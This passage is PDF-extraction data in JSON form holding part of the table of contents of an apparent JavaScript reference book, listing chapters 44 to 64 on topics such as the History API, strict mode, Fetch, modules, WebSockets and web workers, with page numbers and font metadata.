        "text": "Section 44.2: Persistent Prompt Modal   280",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.3: Con\ufb01rm to Delete element   281",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.4: Usage of alert()   281",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 44.5: Usage of prompt()   282",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 45: execCommand and contenteditable   283",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.1: Listening to Changes of contenteditable   284",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.2: Getting started   284",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.3: Copy to clipboard from textarea using execCommand(\"copy\")   285",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 45.4: Formatting   285",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 46: History   287",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.1: history.pushState()   287",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.2: history.replaceState()   287",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 46.3: Load a speci\ufb01c URL from the history list   287",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 47: Navigator Object   289",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 47.1: Get some basic browser data and return it as a JSON object   289",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 48: BOM (Browser Object Model)   290",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 48.1: Introduction   290",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 48.2: Window Object Properties   290",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 48.3: Window Object Methods  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... 291",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 49: The Event Loop   292",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 49.1: The event loop in a web browser   292",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 49.2: Asynchronous operations and the event loop   293",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 50: Strict mode   294",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.1: For entire scripts   294",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.2: For functions   294",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.3: Changes to properties   294",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.4: Changes to global properties   295",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.5: Duplicate Parameters   296",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.6: Function scoping in strict mode   296",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.7: Behaviour of a function's arguments list   296",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 50.8: Non-Simple parameter lists   297",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 51: Custom Elements   299",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 51.1: Extending Native Elements   299",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 51.2: Registering New Elements   299",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 52: Data Manipulation   300",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 52.1: Format numbers as money   300",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 52.2: Extract extension from \ufb01le name   300",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 52.3: Set object property given its string name   301",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 53: Binary Data   302",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.1: Getting binary representation of an image \ufb01le   302",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.2: Converting between Blobs and ArrayBu\ue023ers   302",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.3: Manipulating ArrayBu\ue023ers with DataViews   303",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.4: Creating a TypedArray from a Base64 string   303",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.5: Using TypedArrays   304",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 53.6: Iterating through an arrayBu\ue023er   304",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 54: Template Literals   306",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.1: Basic interpolation and multiline strings   306",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.2: Tagged strings   306",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.3: Raw strings   307",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.4: Templating HTML With Template Strings   307",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 54.5: Introduction   308",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 55: Fetch   309",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.1: Getting JSON data   309",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.2: Set Request Headers   309",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.3: POST Data   309",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.4: Send cookies   310",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.5: GlobalFetch   310",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.6: Using Fetch to Display Questions from the Stack Over\ufb02ow API   310",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 56: Scope   311",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.1: Closures   311",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.2: Hoisting   312",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.3: Di\ue023erence between var and let   315",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.4: Apply and Call syntax and invocation   317",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.5: Arrow function invocation   318",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.6: Bound invocation   319",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.7: Method invocation   319",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.8: Anonymous invocation   320",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.9: Constructor invocation  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... 320",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.10: Using let in loops instead of var (click handlers example)   320",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 57: Modules   322",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.1: De\ufb01ning a module   322",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.2: Default exports   322",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.3: Importing named members from another module   323",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.4: Importing an entire module   323",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.5: Importing named members with aliases   324",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.6: Importing with side e\ue023ects   324",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.7: Exporting multiple named members   324",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 58: Screen   325",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 58.1: Getting the screen resolution   325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 58.2: Getting the \u201cavailable\u201d area of the screen   325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 58.3: Page width and height   325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 58.4: Window innerWidth and innerHeight Properties   325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 58.5: Getting color information about the screen   325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 59: Variable coercion/conversion   326",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.1: Double Negation (!!x)   326",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.2: Implicit conversion   326",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.3: Converting to boolean   326",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.4: Converting a string to a number   327",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.5: Converting a number to a string   328",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.6: Primitive to Primitive conversion table   328",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.7: Convert an array to a string   328",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.8: Array to String using array methods   329",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.9: Converting a number to a boolean   329",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.10: Converting a string to a boolean   329",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.11: Integer to Float   329",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.12: Float to Integer   330",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.13: Convert string to \ufb02oat   330",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 60: Destructuring assignment   331",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.1: Destructuring Objects   331",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.2: Destructuring function arguments   332",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.3: Nested Destructuring   332",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.4: Destructuring Arrays   333",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.5: Destructuring inside variables   333",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.6: Default Value While Destructuring   334",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.7: Renaming Variables While Destructuring   334",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 61: WebSockets   335",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 61.1: Working with string messages   335",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 61.2: Establish a web socket connection   335",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 61.3: Working with binary messages   335",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 61.4: Making a secure web socket connection   336",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 62: Arrow Functions   337",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.1: Introduction   337",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.2: Lexical Scoping & Binding (Value of \"this\")   337",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.3: Arguments Object   338",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.4: Implicit Return   338",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.5: Arrow functions as a constructor   339",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.6: Explicit Return  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... 339",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 63: Workers   340",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.1: Web Worker   340",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.2: A simple service worker   340",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.3: Register a service worker   341",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.4: Communicating with a Web Worker   341",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.5: Terminate a worker   342",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.6: Populating your cache   343",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.7: Dedicated Workers and Shared Workers   343",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 64: requestAnimationFrame   345",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 64.1: Use requestAnimationFrame to fade in element   345",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
